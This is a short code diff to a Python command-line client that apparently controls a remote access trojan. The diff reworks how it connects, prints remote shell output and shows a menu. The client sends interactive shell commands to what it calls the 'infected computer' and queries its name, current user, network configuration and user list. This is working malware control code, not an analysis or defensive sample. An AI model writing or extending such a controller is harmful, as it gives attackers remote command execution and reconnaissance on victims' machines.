@@ -13,7 +13,7 @@ parser.add_argument("-b", "--buffsize", type=int, choices=[1024, 2048, 4096, 819
 args = parser.parse_args()
 
 client.start()
-client.bind()
+client.conn()
 
 if args.shell:
     choix = "1"
@@ -26,23 +26,18 @@ else:
 client.send(choix)
 if choix == "1":
     while True:
-        client.receive()
+        print(client.receive(), end="")
         cmd = input()
         client.send(cmd)
         if cmd == "quit":
             client.quit()
         else:
-            client.receive()
+            print(client.receive(), end="")
 
 elif choix == "2":
     if args.informations == "computername":
         choix2 = "1"
     else:
-        print("\nPress 1 to get the infected computer name")
-        print("Press 2 to see who is the current user")
-        print("Press 3 to get the network configuration")
-        print("Press 4 to get the list of users")
-        print("Press 0 to quit")
-        choix2 = input()
+        choix2 = client.affiche_choix()
 
     client.choice_information(choix2)
